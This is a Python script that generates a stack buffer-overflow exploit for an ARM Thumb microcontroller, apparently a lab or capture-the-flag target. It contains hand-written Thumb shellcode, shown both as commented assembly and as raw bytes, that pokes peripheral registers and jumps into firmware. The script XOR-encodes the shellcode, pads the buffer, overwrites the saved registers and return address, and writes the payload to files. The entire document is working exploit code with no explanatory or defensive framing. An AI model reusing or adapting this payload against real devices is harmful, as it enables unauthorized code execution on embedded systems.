import struct

# Parameters
buffer_size = 128  # Replace with actual buffer size
return_address_offset = 12  # Replace with actual offset to return address
injected_code_address = 0x10000738 + 0x01# Address of injected code


    # mov  sp, pc
    # movw r2, #0x8101
    # movt r2, #0x4802
    # movs r1, #0x80
    # strb r1, [r2, #0xf]
    # strb r1, [r2, #0x10]
    # movs r1, #3
    # strb r1, [r2, #3]

    # movw  r2, #0x0325
    # movt  r2, #0x0800
    # add sp, #0x8C
    # mov   pc, r2   
# Injected code (binary representation of the assembly code above)
original_injected_code = b"\xfd\x46\x48\xf2\x01\x12\xc4\xf6\x02\x02\x80\x21\xd1\x73\x11\x74\x03\x21\xd1\x70\x40\xf2\x25\x32\xc0\xf6\x00\x02\x23\xb0\x97\x46"

padding = b"\xff" * ((buffer_size - len(original_injected_code)))

# callee saved registers
r6 = b"\x00\x00\x00\x00"  # r6
r5 = b"\x18\x00\x00\x00"  # r5
r4 = b"\x90\x02\x00\x08"  # r4


# Overwrite return address
return_address = struct.pack("<I", injected_code_address)

# XOR key (hex: 4242424242424242)
xor_key = b"\x42\x42\x42\x42\x42\x42\x42\x42"

# XOR the injected code with the key
injected_code = bytes([original_injected_code[i] ^ xor_key[i % len(xor_key)] for i in range(len(original_injected_code))])

# Combine exploit
exploit = injected_code + padding + r4 + r5 + r6 + return_address

# Save to binary file
with open("exploit", "wb") as f:
    f.write(exploit)

with open("exploit_hex", "w") as f:
    f.write(exploit.hex())